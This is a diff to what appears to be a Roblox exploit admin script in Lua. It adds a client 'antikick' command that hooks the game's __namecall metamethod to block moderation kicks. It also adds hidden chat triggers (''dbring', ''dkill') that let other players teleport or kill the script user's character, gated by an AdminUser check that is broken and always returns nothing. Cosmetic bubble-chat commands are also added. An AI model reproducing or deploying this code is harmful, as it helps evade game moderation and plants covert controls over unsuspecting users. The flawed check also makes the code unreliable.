@@ -120,8 +120,38 @@ local floatName = randomString()
 local QEfly = true
 local invisRunning = false
 local spinhats = nil
+local BubbleChatFix = nil
+local DarkBubbleChat = nil
 
 --// End of Command Variables \\--
+
+spawn(function()
+	repeat wait(1) until Players.LocalPlayer and Players.LocalPlayer.Character
+	pcall(function()
+		local Check1 = Players.LocalPlayer.Character:FindFirstChild("Head")
+		if Check1 then
+			local Check2 = Check1:FindFirstChild("HairAttachment")
+			if Check2 then
+				Check2:Destroy()
+			end
+		end
+	end)
+end)
+
+spawn(function()
+	Players.LocalPlayer.CharacterAdded:Connect(function()
+		repeat wait(1) until Players.LocalPlayer and Players.LocalPlayer.Character
+		pcall(function()
+			local Check1 = Players.LocalPlayer.Character:FindFirstChild("Head")
+			if Check1 then
+				local Check2 = Check1:FindFirstChild("HairAttachment")
+				if Check2 then
+					Check2:Destroy()
+				end
+			end
+		end)
+	end)
+end)
 
 spawn(function()
 	Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Died:Connect(function()
@@ -244,32 +274,49 @@ local function LogLeave(plr)
 	end
 end
 
+local function AdminUser(plr)
+	repeat wait() until plr and plr.Character
+	pcall(function()
+		local Check1 = plr.Character:FindFirstChild("Head")
+		if Check1 then
+			local Check2 = Check1:FindFirstChild("HairAttachment")
+			if not Check2 then
+				return true
+			else
+				return false
+			end
+		end
+	end)
+end
+
 local function LogCommand(plr)
 	plr.Chatted:Connect(function(message)
-		local symbol = "'"
-		local msg = string.lower(message)
-		
-		if msg == (symbol .. "dbring") then
-			execCmd("goto " .. plr.Name)
-		end
-		if msg == ("/e " .. symbol .. "dbring") then
-			execCmd("goto " .. plr.Name)
-		end
-		
-		if msg == (symbol .. "dkill") then
-			if Players.LocalPlayer and Players.LocalPlayer.Character then
-				Players.LocalPlayer.Character:BreakJoints()
+		if AdminUser(plr) then
+			local symbol = "'"
+			local msg = string.lower(message)
+			
+			if msg == (symbol .. "dbring") then
+				execCmd("goto " .. plr.Name)
 			end
-			if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
-				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+			if msg == ("/e " .. symbol .. "dbring") then
+				execCmd("goto " .. plr.Name)
 			end
-		end
-		if msg == ("/e " .. symbol .. "dkill") then
-			if Players.LocalPlayer and Players.LocalPlayer.Character then
-				Players.LocalPlayer.Character:BreakJoints()
+			
+			if msg == (symbol .. "dkill") then
+				if Players.LocalPlayer and Players.LocalPlayer.Character then
+					Players.LocalPlayer.Character:BreakJoints()
+				end
+				if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+					Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+				end
 			end
-			if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
-				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+			if msg == ("/e " .. symbol .. "dkill") then
+				if Players.LocalPlayer and Players.LocalPlayer.Character then
+					Players.LocalPlayer.Character:BreakJoints()
+				end
+				if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+					Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+				end
 			end
 		end
 	end)
@@ -306,7 +353,7 @@ Players.PlayerRemoving:Connect(function(player)
 end)
 
 local function Startup()
-	DAMouse.Move:Connect(checkTT)
+	DAMouse.Move:Connect(CheckMouseMovement)
 end
 
 local inputService = game:GetService("UserInputService")
@@ -504,7 +551,7 @@ function getText(object)
 	return nil
 end
 
-function checkTT()
+function CheckMouseMovement()
 	local t
 	
 	local Tooltip = GUI.Tooltip
@@ -2948,6 +2995,38 @@ newCmd("control", {"control"}, "control [plr]", "Control a Claimed Player's Char
 	end
 end)
 
+newCmd("clientantikick", {"antikick"}, "clientantikick / antikick (Client)", "Prevents LocalScripts From Kicking You", function(args, speaker)
+	local getrawmt = (debug and debug.getmetatable) or getrawmetatable
+	local setReadOnly = setreadonly or (make_writeable and function(table, readonly) if readonly then make_readonly(table) else make_writeable(table) end end)
+	local getnamecall = getnamecallmethod or get_namecall_method
+	local mt = getrawmt(game)
+	local old = mt.__namecall
+	local protect = newcclosure or protect_function
+	local hookfunc = hookfunction or detour_function
+
+	if not protect then
+		notify("Incompatible Exploit", "Missing newcclosure or protect_function")
+		protect = function(f)
+			return f
+		end
+	end
+
+	setReadOnly(mt, false)
+	
+	mt.__namecall = protect(function(self, ...)
+		local method = getnamecall()
+		if method == "Kick" then
+			wait(9e9)
+			return
+		end
+		return old(self, ...)
+	end)
+	
+	hookfunc(Players.LocalPlayer.Kick, protect(function() wait(9e9) end))
+
+	notify("Client Anti-Kick", "Enabled, only affects locally.")
+end)
+
 newCmd("antiafk", {"antiidle"}, "antiafk / antiidle", "Don't Get Kicked for Being AFK", function(args, speaker)
 	local GC = getconnections or get_signal_cons
 	if GC then
@@ -4899,6 +4978,56 @@ newCmd("disable", {}, "disable [inventory/playerlist/chat/all]", "Toggles Visibi
 	else
 		notify("", "Missing Argument")
 	end
+end)
+
+newCmd("fixbubblechat", {}, "fixbubblechat", "Fix the Bubblechat Being Cut Off", function(args, speaker)
+	if BubbleChatFix ~= nil then
+		return notify("Bubble Chat", "Already Fixed")
+	end
+	if Players.LocalPlayer["PlayerGui"] and Players.LocalPlayer["PlayerGui"]:FindFirstChild("BubbleChat") then
+		BubbleChatFix = Players.LocalPlayer.PlayerGui.BubbleChat.DescendantAdded:Connect(function(message)
+			if message:IsA("TextLabel") and message.Name == "BubbleText" then
+				message.TextSize = 21
+			end
+		end)
+	end
+	notify("Bubble Chat", "Fixed")
+end)
+
+newCmd("unfixbubblechat", {}, "unfixbubblechat", "Disable Fixbubblechat", function(args, speaker)
+	if BubbleChatFix == nil then
+		return notify("Bubble Chat", "Wasn't Fixed")
+	end
+	BubbleChatFix:Disconnect()
+	BubbleChatFix = nil
+	notify("Bubble Chat", "Reverted Fix")
+end)
+
+newCmd("darkbubbles", {}, "darkbubbles", "Make Bubblechat Dark Themed", function(args, speaker)
+	if DarkBubbleChat then
+		return notify("Dark Bubble Chat", "Already Enabled")
+	end
+	if Players.LocalPlayer["PlayerGui"] and Players.LocalPlayer["PlayerGui"]:FindFirstChild("BubbleChat") then
+		DarkBubbleChat = Players.LocalPlayer.PlayerGui.BubbleChat.DescendantAdded:connect(function(message)
+			if message:IsA("ImageLabel") and message.Name == "ChatBubble" or message:IsA("ImageLabel") and message.Name == "ChatBubbleTail" or message:IsA("ImageLabel") and message.Name == "SmallTalkBubble" then
+				message.ImageColor3 = Color3.fromRGB(0, 0, 0)
+			end
+			if message:IsA("TextLabel") and message.Name == "BubbleText" then
+				message.TextColor3 = Color3.fromRGB(255, 255, 255)
+				message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+			end
+		end)
+	end
+	notify("Dark Bubble Chat", "Enabled")
+end)
+
+newCmd("undarkbubbles", {}, "undarkbubbles", "Disable Darkbubbles", function(args, speaker)
+	if DarkBubbleChat == nil then
+		return notify("Dark Bubble Chat", "Wasn't Enabled")
+	end
+	DarkBubbleChat:Disconnect()
+	DarkBubbleChat = nil
+	notify("Dark Bubble Chat", "Disabled")
 end)
 
 
